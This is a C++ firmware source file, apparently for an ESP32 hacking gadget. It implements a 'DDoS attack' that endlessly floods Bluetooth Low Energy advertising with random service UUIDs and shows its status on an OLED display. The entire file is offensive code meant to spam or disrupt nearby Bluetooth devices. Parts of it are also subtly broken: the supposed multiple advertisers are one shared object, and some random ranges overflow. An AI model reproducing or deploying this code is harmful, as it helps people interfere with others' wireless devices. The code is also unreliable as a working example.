#include "DDoSAttack.h"
#include <BLEDevice.h>
#include <Adafruit_SSD1306.h>
#include <vector>

extern Adafruit_SSD1306 display;

// Configuration Variables
int numDevices = 5;               // Number of devices to simulate
int advertisingInterval = 50;     // Advertising interval in ms
std::vector<String> uuids;        // List of UUIDs for randomization

void DDoSAttack::start() {
  Serial.println("Starting DDoS Attack...");

  // Initialize UUIDs for randomization
  initializeUUIDs();

  // Display status on OLED
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println("DDoS Attack Active");
  display.setCursor(0, 10);
  display.println("Devices: " + String(numDevices));
  display.setCursor(0, 20);
  display.println("Interval: " + String(advertisingInterval) + " ms");
  display.display();

  // Create and start multiple advertisers
  std::vector<BLEAdvertising *> advertisers;
  for (int i = 0; i < numDevices; i++) {
    BLEAdvertising *advertiser = BLEDevice::getAdvertising();
    advertiser->addServiceUUID(uuids[random(0, uuids.size())]);  // Random UUID
    advertiser->setMinInterval(advertisingInterval);
    advertiser->setMaxInterval(advertisingInterval + 50);  // Slight variation
    advertiser->start();
    advertisers.push_back(advertiser);
    delay(10);  // Small delay to prevent conflicts
  }

  // Attack loop (indefinite until reset or stopped)
  while (true) {
    // Randomize advertising data periodically
    for (auto advertiser : advertisers) {
      advertiser->addServiceUUID(uuids[random(0, uuids.size())]);
      delay(10);  // Prevent overloading
    }
  }
}

void DDoSAttack::initializeUUIDs() {
  uuids.clear();
  for (int i = 0; i < 20; i++) {
    char uuid[37];
    snprintf(uuid, sizeof(uuid), "%08X-%04X-%04X-%04X-%012X",
             random(0x100000000), random(0x10000), random(0x10000),
             random(0x10000), random(0x100000000000));
    uuids.push_back(String(uuid));
  }
}
